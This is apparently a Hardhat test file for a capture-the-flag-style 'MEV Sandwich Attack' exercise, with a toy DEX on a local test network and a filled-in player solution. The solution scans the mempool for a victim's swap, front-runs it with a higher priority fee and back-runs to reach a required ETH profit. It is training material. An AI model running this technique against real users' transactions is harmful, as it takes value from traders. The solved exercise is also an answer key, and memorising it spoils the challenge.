const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
const { mine } = require("@nomicfoundation/hardhat-network-helpers");

/**
 * Test for the MEV Sandwich Attack Exercise
 */
describe("MEV Sandwich Attack Exercise", function () {
  let usdcToken, simpleDEX;
  let deployer, player, victim;

  /**
   * Constants for the challenge
   * Do not change their values!
   */
  const INITIAL_LIQUIDITY_ETH = ethers.parseEther("500"); // pool: 500 ETH
  const INITIAL_LIQUIDITY_USDC = ethers.parseEther("1000000"); // Small pool: 1,000,000 USDC
  const PLAYER_INITIAL_ETH = ethers.parseEther("15"); // Player has 15 ETH
  const VICTIM_INITIAL_ETH = ethers.parseEther("50"); // Victim has 50 ETH
  const VICTIM_SWAP_AMOUNT = ethers.parseEther("20"); // Victim swaps 20 ETH
  const TARGET_PROFIT = ethers.parseEther("1"); // Target: 1 ETH profit

  before("Set up the challenge", async function () {
    /** DO NOT CHANGE ANYTHING HERE */

    // Get signers
    [deployer, player, victim] = await ethers.getSigners();

    console.log(`Deployer: ${deployer.address}`);
    console.log(`Player (attacker): ${player.address}`);
    console.log(`Victim: ${victim.address}`);

    // Set up balances - only ETH, no USDC
    await setBalance(player.address, PLAYER_INITIAL_ETH);
    await setBalance(victim.address, VICTIM_INITIAL_ETH);

    console.log(
      `Player's initial balance: ${ethers.formatEther(PLAYER_INITIAL_ETH)} ETH`
    );
    console.log(
      `Victim's initial balance: ${ethers.formatEther(VICTIM_INITIAL_ETH)} ETH`
    );

    // Deploy token contracts
    console.log("Deploying USDC token contract...");
    const USDCToken = await ethers.getContractFactory("USDCToken", deployer);
    usdcToken = await USDCToken.deploy(INITIAL_LIQUIDITY_USDC.toString());
    await usdcToken.waitForDeployment();

    console.log(`USDC Token deployed at: ${usdcToken.target}`);

    // Deploy SimpleDEX
    console.log("Deploying SimpleDEX...");
    const SimpleDEX = await ethers.getContractFactory("SimpleDEX", deployer);
    simpleDEX = await SimpleDEX.deploy(usdcToken.target);
    await simpleDEX.waitForDeployment();

    console.log(`SimpleDEX deployed at: ${simpleDEX.target}`);

    // Add initial liquidity to SimpleDEX
    console.log("Adding initial liquidity to SimpleDEX...");
    await usdcToken
      .connect(deployer)
      .approve(simpleDEX.target, INITIAL_LIQUIDITY_USDC);
    await simpleDEX
      .connect(deployer)
      .addLiquidity(INITIAL_LIQUIDITY_USDC, { value: INITIAL_LIQUIDITY_ETH });

    console.log(
      `Added ${ethers.formatEther(
        INITIAL_LIQUIDITY_ETH
      )} ETH and ${ethers.formatEther(
        INITIAL_LIQUIDITY_USDC
      )} USDC to SimpleDEX`
    );

    // Mine the transactions above
    mine(1);

    // Victim send the transaction to swap its eth to usdc to the mempool
    await simpleDEX.connect(victim).ethToUsdc({ value: VICTIM_SWAP_AMOUNT });
  });

  it("Executes the player's code", async function () {
    // See the mempool
    const pendingBlock = await network.provider.send("eth_getBlockByNumber", [
      "pending",
      false,
    ]);

    // Use our explorer function to show detailed transaction info
    const targetTx = await exploreMempoolTransactions(
      pendingBlock.transactions,
      simpleDEX,
      "ethToUsdc"
    );

    // Calculate ETH to use (all player's ETH minus some for gas)
    const gasBuffer = ethers.parseEther("0.01"); // Keep 0.01 ETH for gas costs
    const frontrunAmount = PLAYER_INITIAL_ETH - gasBuffer;
    console.log(
      `\nExecuting frontrun: swapping ${ethers.formatEther(
        frontrunAmount
      )} ETH for USDC...`
    );

    const frontrunTx = await simpleDEX.connect(player).ethToUsdc({
      value: frontrunAmount,
      maxPriorityFeePerGas: targetTx.maxPriorityFeePerGas + BigInt(1000000000), // +1 Gwei
      maxFeePerGas: targetTx.maxFeePerGas + BigInt(1000000000), // +1 Gwei
    });

    mine(1);

    // backrun the transaction
    const backrunAmount = await usdcToken.balanceOf(player.address);
    await usdcToken.connect(player).approve(simpleDEX.target, backrunAmount);
    await simpleDEX.connect(player).usdcToEth(backrunAmount);
  });

  after("Success conditions", async function () {
    /** DO NOT CHANGE ANYTHING HERE */

    // Wait for a block to mine
    await mine(1);

    // Calculate profit
    const finalPlayerEthBalance = await ethers.provider.getBalance(
      player.address
    );
    const finalPlayerUsdcBalance = await usdcToken.balanceOf(player.address);

    const ethProfit = finalPlayerEthBalance - PLAYER_INITIAL_ETH;

    const finalVictimEthBalance = await ethers.provider.getBalance(
      victim.address
    );
    const finalVictimUsdcBalance = await usdcToken.balanceOf(victim.address);

    console.log(`\nSandwich attack complete!`);
    console.log(
      `Final player ETH balance: ${ethers.formatEther(
        finalPlayerEthBalance
      )} ETH`
    );
    console.log(
      `Final player USDC balance: ${ethers.formatEther(
        finalPlayerUsdcBalance
      )} USDC`
    );
    console.log(`ETH profit: ${ethers.formatEther(ethProfit)} ETH`);
    console.log(
      `\nVictim's final ETH balance: ${ethers.formatEther(
        finalVictimEthBalance
      )} ETH`
    );
    console.log(
      `Victim's final USDC balance: ${ethers.formatEther(
        finalVictimUsdcBalance
      )} USDC`
    );

    // Verify profit meets the target
    expect(
      ethProfit,
      `Player should make at least ${ethers.formatEther(
        TARGET_PROFIT
      )} ETH profit`
    ).to.be.gte(TARGET_PROFIT);

    // Show final market state
    console.log("\n----- Final Market State -----");
    const finalEthReserve = await ethers.provider.getBalance(simpleDEX.target);
    const finalUsdcReserve = await usdcToken.balanceOf(simpleDEX.target);
    const finalPrice = await simpleDEX.getCurrentUsdcToEthPrice();

    console.log(
      `Final ETH reserve: ${ethers.formatEther(finalEthReserve)} ETH`
    );
    console.log(
      `Final USDC reserve: ${ethers.formatEther(finalUsdcReserve)} USDC`
    );
    console.log(`Final price: ${ethers.formatEther(finalPrice)} USDC per ETH`);
  });
});

/**
 * Explores the mempool and prints detailed information about pending transactions
 * @param {array} transactions - Array of transaction hashes from the mempool
 * @param {object} contract - The contract to check for function calls (optional)
 * @param {string} targetFunction - The specific function name to look for (optional)
 * @returns {object} Found transaction details if target function is found, otherwise null
 */
async function exploreMempoolTransactions(
  transactions,
  contract = null,
  targetFunction = null
) {
  console.log("\n---------- MEMPOOL INSPECTION ----------");
  console.log(
    `Number of transactions in pending block: ${transactions.length}`
  );

  let targetTx = null;

  for (const txHash of transactions) {
    try {
      const tx = await ethers.provider.getTransaction(txHash);
      console.log(`\nTransaction: ${txHash}`);
      console.log(`From: ${tx.from}`);
      console.log(`To: ${tx.to}`);

      // Display EIP-1559 gas parameters
      console.log(
        `Max Fee Per Gas: ${ethers.formatUnits(tx.maxFeePerGas, "gwei")} gwei`
      );
      console.log(
        `Max Priority Fee Per Gas: ${ethers.formatUnits(
          tx.maxPriorityFeePerGas,
          "gwei"
        )} gwei`
      );

      console.log(`Gas Limit: ${tx.gasLimit}`);
      console.log(`Nonce: ${tx.nonce}`);
      console.log(`Value: ${ethers.formatEther(tx.value || 0)} ETH`);
      console.log(`Type: ${tx.type}`);

      // If a contract is provided, try to decode the transaction data
      if (contract && tx.to === contract.target) {
        try {
          const decodedFunction = contract.interface.parseTransaction({
            data: tx.data,
          });
          console.log(`Function: ${decodedFunction.name}`);

          // Handle BigInt in arguments
          const args = decodedFunction.args
            ? decodedFunction.args.map((arg) =>
                typeof arg === "bigint" ? arg.toString() : arg
              )
            : [];

          console.log(`Arguments: ${JSON.stringify(args)}`);

          // If we're looking for a specific function and found it
          if (targetFunction && decodedFunction.name === targetFunction) {
            console.log(
              `\n📣 FOUND TARGET: This is the ${targetFunction} transaction we're looking for!`
            );

            // Log EIP-1559 gas info
            console.log(
              `Transaction Max Fee Per Gas: ${ethers.formatUnits(
                tx.maxFeePerGas,
                "gwei"
              )} gwei`
            );
            console.log(
              `Transaction Max Priority Fee Per Gas: ${ethers.formatUnits(
                tx.maxPriorityFeePerGas,
                "gwei"
              )} gwei`
            );

            // Extract the ETH amount from the transaction (for ethToUsdc function)
            console.log(
              `Transaction Value: ${ethers.formatEther(tx.value)} ETH`
            );

            // Store the target transaction details for return
            targetTx = {
              hash: txHash,
              from: tx.from,
              to: tx.to,
              maxFeePerGas: tx.maxFeePerGas,
              maxPriorityFeePerGas: tx.maxPriorityFeePerGas,
              gasLimit: tx.gasLimit,
              data: tx.data,
              value: tx.value,
              type: tx.type,
              function: decodedFunction.name,
              args: args,
            };
          }
        } catch (e) {
          console.log(`Failed to decode transaction data: ${e.message}`);
        }
      }
    } catch (e) {
      console.log(`Failed to get transaction ${txHash}: ${e.message}`);
    }
  }

  return targetTx;
}
